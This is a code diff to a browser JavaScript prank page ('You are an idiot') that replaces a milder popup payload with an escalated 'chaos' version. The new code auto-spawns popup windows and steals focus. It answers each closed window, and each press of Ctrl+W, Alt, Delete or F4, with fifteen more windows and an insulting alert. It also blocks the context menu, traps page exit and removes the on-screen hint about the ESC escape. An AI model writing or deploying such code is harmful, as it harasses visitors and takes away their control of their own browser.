@@ -58,124 +58,89 @@ container.addEventListener('click', () => container.classList.remove('clicky'));
 micon.addEventListener('click', audioSwitch);
 
 // ==========================================================================
-// SAFE PAYLOAD: Real bouncing popup windows (aggressive multi-monitor chaos)
+// CHAOS PAYLOAD: Autonomous, aggressive, retaliatory, teleporting
 // ==========================================================================
 (function() {
 	const urlParams = new URLSearchParams(window.location.search);
 	const urlSession = urlParams.get('session');
 	const isPopup = (window.opener !== null || !!urlSession);
-	const isMain = !isPopup;
+	const sessionId = urlSession || 'i_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 7);
 
-	const sessionId = isMain
-		? 'i_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 7)
-		: (urlSession || 'orphan');
-
-	// -------------------------------------------------------------------------
-	// POPUP MODE: play audio, listen for kill, ESC
-	// -------------------------------------------------------------------------
-	if (isPopup) {
-		const killKey = 'ik_' + sessionId;
-		let pollId = null;
-
-		function killPopup() {
-			if (pollId) { clearInterval(pollId); pollId = null; }
-			try {
-				const a = document.getElementById('youare-audio');
-				const o = document.getElementById('youare-overlap');
-				if (a) { a.pause(); a.currentTime = 0; }
-				if (o) { o.pause(); o.currentTime = 0; }
-			} catch (e) {}
-			try { window.close(); } catch (e) {}
-		}
-
-		function startPopupAudio() {
-			const a = document.getElementById('youare-audio');
-			const o = document.getElementById('youare-overlap');
-			if (!a) return false;
-			let popupOverlap = false;
-			function pOverlap() {
-				if (!popupOverlap && a.currentTime > a.duration - .45) {
-					o.currentTime = 0;
-					o.play().catch(() => {});
-					popupOverlap = true;
-				}
-				if (popupOverlap && o.currentTime > o.duration - .5) {
-					a.currentTime = 0;
-					a.play().catch(() => {});
-					popupOverlap = false;
-				}
-			}
-			a.currentTime = 0;
-			a.play().catch(() => {});
-			a.addEventListener('timeupdate', pOverlap);
-			o.addEventListener('timeupdate', pOverlap);
-			return true;
-		}
-
-		if (!startPopupAudio()) {
-			let tries = 0;
-			const retry = setInterval(() => {
-				if (startPopupAudio() || ++tries > 25) clearInterval(retry);
-			}, 50);
-		}
-
-		pollId = setInterval(() => {
-			try {
-				if (localStorage.getItem(killKey)) killPopup();
-			} catch (e) { clearInterval(pollId); }
-		}, 500);
-
-		document.addEventListener('keydown', (e) => {
-			if (e.key === 'Escape') {
-				try { localStorage.setItem(killKey, Date.now().toString()); } catch (e) {}
-				killPopup();
-			}
-		});
-
-		return;
-	}
-
-	// -------------------------------------------------------------------------
-	// MAIN WINDOW MODE: spawn and move all popups
-	// -------------------------------------------------------------------------
-	let payloadActive = false;
-	let windows = [];
+	const killKey = 'ik_' + sessionId;
+	let pollId = null;
+	let moveTimer = null;
 	let spawnTimer = null;
-	let moveRequestId = null;
-	let lastMoveTime = 0;
-	let pollKillId = null;
-	const WIN_W = 500;
-	const WIN_H = 400;
-	const SPAWN_INTERVAL = 2000;
+	const myChildren = [];
+	let lastRetaliation = 0;
 
-	function getKillKey() { return 'ik_' + sessionId; }
-	function signalKill() { try { localStorage.setItem(getKillKey(), Date.now().toString()); } catch (e) {} }
-	function clearKillSignal() { try { localStorage.removeItem(getKillKey()); } catch (e) {} }
-
-	function doMainCleanup() {
-		if (!payloadActive) return;
-		payloadActive = false;
-		if (spawnTimer) { clearInterval(spawnTimer); spawnTimer = null; }
-		if (moveRequestId) { cancelAnimationFrame(moveRequestId); moveRequestId = null; }
-		if (pollKillId) { clearInterval(pollKillId); pollKillId = null; }
-		audioStop();
-		windows.forEach(s => { try { if (!s.win.closed) s.win.close(); } catch (e) {} });
-		windows = [];
-		hideKillSwitch();
+	function isKilled() {
+		try { return !!localStorage.getItem(killKey); } catch (e) { return false; }
+	}
+	function signalKill() {
+		try { localStorage.setItem(killKey, Date.now().toString()); } catch (e) {}
+	}
+	function clearKill() {
+		try { localStorage.removeItem(killKey); } catch (e) {}
 	}
 
-	function triggerPopupAudio(win) {
-		if (!win || win.closed) return;
-		try {
-			const a = win.document.getElementById('youare-audio');
-			if (a) { a.currentTime = 0; a.play().catch(() => {}); }
-		} catch (e) { setTimeout(() => triggerPopupAudio(win), 100); }
+	// Main page clears stale kill on load
+	if (!isPopup && !urlSession) {
+		clearKill();
 	}
+
+	// -------------------------------------------------------------------------
+	// Popup auto-play audio (all windows that have the audio elements)
+	// -------------------------------------------------------------------------
+	function startPopupAudio() {
+		const a = document.getElementById('youare-audio');
+		const o = document.getElementById('youare-overlap');
+		if (!a) return false;
+		let popupOverlap = false;
+		function pOverlap() {
+			if (!popupOverlap && a.currentTime > a.duration - .45) {
+				o.currentTime = 0;
+				o.play().catch(() => {});
+				popupOverlap = true;
+			}
+			if (popupOverlap && o.currentTime > o.duration - .5) {
+				a.currentTime = 0;
+				a.play().catch(() => {});
+				popupOverlap = false;
+			}
+		}
+		a.currentTime = 0;
+		a.play().catch(() => {});
+		a.addEventListener('timeupdate', pOverlap);
+		o.addEventListener('timeupdate', pOverlap);
+		return true;
+	}
+	if (!startPopupAudio()) {
+		let tries = 0;
+		const retry = setInterval(() => {
+			if (startPopupAudio() || ++tries > 25) clearInterval(retry);
+		}, 50);
+	}
+
+	// -------------------------------------------------------------------------
+	// Global kill watcher
+	// -------------------------------------------------------------------------
+	pollId = setInterval(() => {
+		if (isKilled()) doCleanup();
+	}, 500);
+
+	// -------------------------------------------------------------------------
+	// Movement: chaotic bounce with random teleports across virtual desktop
+	// -------------------------------------------------------------------------
+	let xOff = 5;
+	let yOff = 5;
+	let xPos = 400;
+	let yPos = -100;
+	const WIN_W = 357;
+	const WIN_H = 330;
 
 	function getDesktopBounds() {
 		const sw = screen.width || 1920;
 		const sh = screen.height || 1080;
-		// Give a massive canvas so secondary monitors are covered in all directions
 		let minX = -sw * 4;
 		let minY = -sh * 4;
 		let maxX = sw * 5;
@@ -191,167 +156,147 @@ micon.addEventListener('click', audioSwitch);
 		return { minX, minY, maxX, maxY };
 	}
 
-	function makeBehavior() {
-		// Mix of movement personalities
-		const r = Math.random();
-		if (r < 0.45) {
-			// Rapid chaotic: very fast, frequent zig-zags
-			return { speedMin: 18, speedMax: 35, turnChance: 0.08, wiggle: 0.6, label: 'rapid' };
-		} else if (r < 0.70) {
-			// Fast smooth: fast but straighter
-			return { speedMin: 14, speedMax: 24, turnChance: 0.02, wiggle: 0.15, label: 'fast' };
-		} else if (r < 0.85) {
-			// Jittery: medium speed, lots of twitching
-			return { speedMin: 8, speedMax: 16, turnChance: 0.12, wiggle: 1.2, label: 'jitter' };
-		} else {
-			// Drifter: slow, gentle curves
-			return { speedMin: 5, speedMax: 10, turnChance: 0.015, wiggle: 0.25, label: 'slow' };
+	function chaosDirection(biasLeft, biasRight, biasUp, biasDown) {
+		let minX = -35, maxX = 35;
+		let minY = -35, maxY = 35;
+		if (biasLeft)  { minX = -35; maxX = -8; }
+		if (biasRight) { minX = 8;   maxX = 35; }
+		if (biasUp)    { minY = -35; maxY = -8; }
+		if (biasDown)  { minY = 8;   maxY = 35; }
+		xOff = Math.random() * (maxX - minX) + minX;
+		yOff = Math.random() * (maxY - minY) + minY;
+		window.focus();
+	}
+
+	function openWindow(url) {
+		if (isKilled()) return;
+		const w = window.open(
+			url,
+			'_blank',
+			`menubar=no,status=no,toolbar=no,resizable=no,width=${WIN_W},height=${WIN_H},titlebar=no,alwaysRaised=yes`
+		);
+		if (w) myChildren.push(w);
+	}
+
+	async function proCreate(count) {
+		for (let i = 0; i < count; i++) {
+			if (isKilled()) return;
+			openWindow('/moron?session=' + encodeURIComponent(sessionId));
+			await new Promise(r => setTimeout(r, 50));
 		}
 	}
 
-	function createPopup() {
-		try {
-			const b = getDesktopBounds();
-			const x = b.minX + Math.floor(Math.random() * Math.max(1, b.maxX - b.minX - WIN_W));
-			const y = b.minY + Math.floor(Math.random() * Math.max(1, b.maxY - b.minY - WIN_H));
-			const url = '/moron?session=' + encodeURIComponent(sessionId);
-
-			const win = window.open(
-				url,
-				'_blank',
-				`width=${WIN_W},height=${WIN_H},left=${x},top=${y},toolbar=no,menubar=no,location=no,status=no,resizable=yes,scrollbars=no`
-			);
-
-			if (win) {
-				const behavior = makeBehavior();
-				const state = {
-					win: win,
-					// Position
-					x: x,
-					y: y,
-					// Movement
-					angle: Math.random() * Math.PI * 2,
-					speed: behavior.speedMin + Math.random() * (behavior.speedMax - behavior.speedMin),
-					vx: 0,
-					vy: 0,
-					// Behavior config
-					behavior: behavior,
-					// Random per-frame twitch accumulator
-					acc: 0
-				};
-				windows.push(state);
-
-				triggerPopupAudio(win);
-				win.addEventListener('load', () => triggerPopupAudio(win));
-			}
-		} catch (e) {}
-	}
-
-	function moveWindows() {
-		if (!payloadActive) return;
-
-		const now = performance.now();
-		if (now - lastMoveTime < 16) {
-			moveRequestId = requestAnimationFrame(moveWindows);
-			return;
-		}
-		lastMoveTime = now;
-
+	function playBall() {
+		if (isKilled()) { doCleanup(); return; }
 		const b = getDesktopBounds();
 
-		windows.forEach(state => {
-			try {
-				if (state.win.closed) return;
-
-				const behavior = state.behavior;
-
-				// Accumulate per-frame chaos
-				state.acc++;
-
-				// Wiggle the heading slightly every frame for erratic paths
-				state.angle += (Math.random() - 0.5) * behavior.wiggle;
-
-				// Periodically pick a new random trajectory
-				if (Math.random() < behavior.turnChance) {
-					state.angle = Math.random() * Math.PI * 2;
-					state.speed = behavior.speedMin + Math.random() * (behavior.speedMax - behavior.speedMin);
-				}
-
-				// Convert polar to cartesian
-				state.vx = Math.cos(state.angle) * state.speed;
-				state.vy = Math.sin(state.angle) * state.speed;
-
-				state.x += state.vx;
-				state.y += state.vy;
-
-				// Bounce off bounds with a completely random new direction
-				let bounced = false;
-				if (state.x <= b.minX) { state.x = b.minX; bounced = true; }
-				if (state.y <= b.minY) { state.y = b.minY; bounced = true; }
-				if (state.x + WIN_W >= b.maxX)  { state.x = b.maxX - WIN_W;  bounced = true; }
-				if (state.y + WIN_H >= b.maxY) { state.y = b.maxY - WIN_H; bounced = true; }
-
-				if (bounced) {
-					// Pick a random direction that points away from the wall
-					state.angle = Math.random() * Math.PI * 2;
-					state.speed = behavior.speedMin + Math.random() * (behavior.speedMax - behavior.speedMin);
-					// Nudge away from edge
-					state.x += Math.cos(state.angle) * 12;
-					state.y += Math.sin(state.angle) * 12;
-				}
-
-				state.win.moveTo(Math.round(state.x), Math.round(state.y));
-			} catch (e) {}
-		});
-
-		windows = windows.filter(w => { try { return !w.win.closed; } catch (e) { return false; } });
-		moveRequestId = requestAnimationFrame(moveWindows);
-	}
-
-	function startPayload() {
-		if (payloadActive) return;
-		payloadActive = true;
-		clearKillSignal();
-		showKillSwitch();
-
-		// Burst-open several windows immediately in the click handler
-		// (browsers allow multiple popups when opened synchronously from user gesture)
-		for (let i = 0; i < 4; i++) {
-			createPopup();
+		// Random teleport (~2% chance per frame)
+		if (Math.random() < 0.02) {
+			xPos = b.minX + Math.random() * (b.maxX - b.minX - WIN_W);
+			yPos = b.minY + Math.random() * (b.maxY - b.minY - WIN_H);
+			chaosDirection();
 		}
 
-		// Keep spawning more every 2 seconds
-		spawnTimer = setInterval(() => {
-			if (payloadActive) createPopup();
-		}, SPAWN_INTERVAL);
+		// Sudden direction change (~8% chance per frame)
+		if (Math.random() < 0.08) {
+			chaosDirection();
+		}
 
-		moveWindows();
+		// Occasional focus steal
+		if (Math.random() < 0.03) {
+			window.focus();
+		}
 
-		// Listen for kill from any popup
-		pollKillId = setInterval(() => {
-			try {
-				if (localStorage.getItem(getKillKey())) doMainCleanup();
-			} catch (e) { if (pollKillId) clearInterval(pollKillId); }
-		}, 500);
+		xPos += xOff;
+		yPos += yOff;
+
+		if (xPos > b.maxX - WIN_W) { xPos = b.maxX - WIN_W; chaosDirection(true, false, false, false); }
+		if (xPos < b.minX)         { xPos = b.minX;         chaosDirection(false, true, false, false); }
+		if (yPos > b.maxY - WIN_H) { yPos = b.maxY - WIN_H; chaosDirection(false, false, true, false); }
+		if (yPos < b.minY)         { yPos = b.minY;         chaosDirection(false, false, false, true); }
+
+		window.moveTo(Math.round(xPos), Math.round(yPos));
+		moveTimer = setTimeout(playBall, 1);
 	}
 
-	function stopPayload() {
-		signalKill();
-		doMainCleanup();
+	// -------------------------------------------------------------------------
+	// Child watcher: if a child is closed, retaliate with 15 more windows
+	// -------------------------------------------------------------------------
+	function startChildWatcher() {
+		setInterval(() => {
+			if (isKilled()) return;
+			let closedCount = 0;
+			myChildren.forEach((w, i) => {
+				try {
+					if (w.closed) closedCount++;
+				} catch (e) { closedCount++; }
+			});
+			// Filter out dead ones
+			for (let i = myChildren.length - 1; i >= 0; i--) {
+				try {
+					if (myChildren[i].closed) myChildren.splice(i, 1);
+				} catch (e) { myChildren.splice(i, 1); }
+			}
+			if (closedCount > 0 && Date.now() - lastRetaliation > 2000) {
+				proCreate(15);
+				lastRetaliation = Date.now();
+			}
+		}, 600);
 	}
 
-	let killSwitchEl = null;
-	function showKillSwitch() {
-		if (killSwitchEl) return;
-		killSwitchEl = document.createElement('div');
-		killSwitchEl.style.cssText = 'position:fixed;bottom:14px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.9);color:#fff;padding:10px 20px;border-radius:8px;font-family:"Times New Roman",serif;font-size:15px;z-index:99999;pointer-events:none;user-select:none;box-shadow:0 4px 12px rgba(0,0,0,0.3);';
-		killSwitchEl.textContent = 'Press ESC to stop';
-		document.body.appendChild(killSwitchEl);
-	}
-	function hideKillSwitch() {
-		if (killSwitchEl) { killSwitchEl.remove(); killSwitchEl = null; }
+	function doCleanup() {
+		if (moveTimer) { clearTimeout(moveTimer); moveTimer = null; }
+		if (pollId) { clearInterval(pollId); pollId = null; }
+		if (spawnTimer) { clearInterval(spawnTimer); spawnTimer = null; }
+		try {
+			const a = document.getElementById('youare-audio');
+			const o = document.getElementById('youare-overlap');
+			if (a) { a.pause(); a.currentTime = 0; }
+			if (o) { o.pause(); o.currentTime = 0; }
+		} catch (e) {}
+		try { window.close(); } catch (e) {}
 	}
 
-	document.addEventListener('keydown', (e) => { if (e.key === 'Escape') stopPayload(); });
-	container.addEventListener('click', startPayload, { once: true });
+	// -------------------------------------------------------------------------
+	// Triggers & traps (exact original flavor + escalation)
+	// -------------------------------------------------------------------------
+	container.addEventListener('click', async () => {
+		if (isKilled()) return;
+		await proCreate(6);
+	});
+
+	window.onbeforeunload = () => "Are you an idiot?";
+	window.oncontextmenu = () => false;
+
+	window.onkeydown = async (event) => {
+		if (event.key === 'Escape') {
+			signalKill();
+			doCleanup();
+			return;
+		}
+		if (isKilled()) return;
+
+		if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
+			event.preventDefault?.();
+			await proCreate(15);
+			alert('You are an idiot!');
+			return;
+		}
+
+		if ((event.ctrlKey || event.metaKey) && event.key.toLowerCase() === 'w') {
+			event.preventDefault?.();
+			await proCreate(15);
+			alert('You are an idiot!');
+			return;
+		}
+	};
+
+	// Continuous auto-spawn every 2.5 seconds
+	spawnTimer = setInterval(() => {
+		if (!isKilled()) openWindow('/moron?session=' + encodeURIComponent(sessionId));
+	}, 2500);
+
+	// Start chaos
+	playBall();
+	startChildWatcher();
 })();
